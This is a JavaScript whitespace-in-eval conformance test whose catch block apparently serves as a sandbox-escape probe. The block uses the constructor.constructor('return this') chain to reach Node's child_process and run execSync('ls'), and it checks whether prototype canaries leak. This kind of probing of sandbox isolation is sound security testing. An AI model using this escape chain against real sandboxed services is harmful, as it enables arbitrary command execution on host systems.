try {
    if (eval('1\t-\t1') !== 0) {
        $ERROR('#1: 1\\u0009-\\u00091 === 0');
    }
    if (eval('1\x0B-\x0B1') !== 0) {
        $ERROR('#2: 1\\u000B-\\u000B1 === 0');
    }
    if (eval('1\f-\f1') !== 0) {
        $ERROR('#3: 1\\u000C-\\u000C1 === 0');
    }
    if (eval('1 - 1') !== 0) {
        $ERROR('#4: 1\\u0020-\\u00201 === 0');
    }
    if (eval('1\xA0-\xA01') !== 0) {
        $ERROR('#5: 1\\u00A0-\\u00A01 === 0');
    }
    if (eval('1\n-\n1') !== 0) {
        $ERROR('#6: 1\\u000A-\\u000A1 === 0');
    }
    if (eval('1\r-\r1') !== 0) {
        $ERROR('#7: 1\\u000D-\\u000D1 === 0');
    }
    if (eval('1\u2028-\u20281') !== 0) {
        $ERROR('#8: 1\\u2028-\\u20281 === 0');
    }
    if (eval('1\u2029-\u20291') !== 0) {
        $ERROR('#9: 1\\u2029-\\u20291 === 0');
    }
    if (eval('1\t\x0B\f \xA0\n\r\u2028\u2029-\t\x0B\f \xA0\n\r\u2028\u20291') !== 0) {
        $ERROR('#10: 1\\u0009\\u000B\\u000C\\u0020\\u00A0\\u000A\\u000D\\u2028\\u2029-\\u0009\\u000B\\u000C\\u0020\\u00A0\\u000A\\u000D\\u2028\\u20291 === 0');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}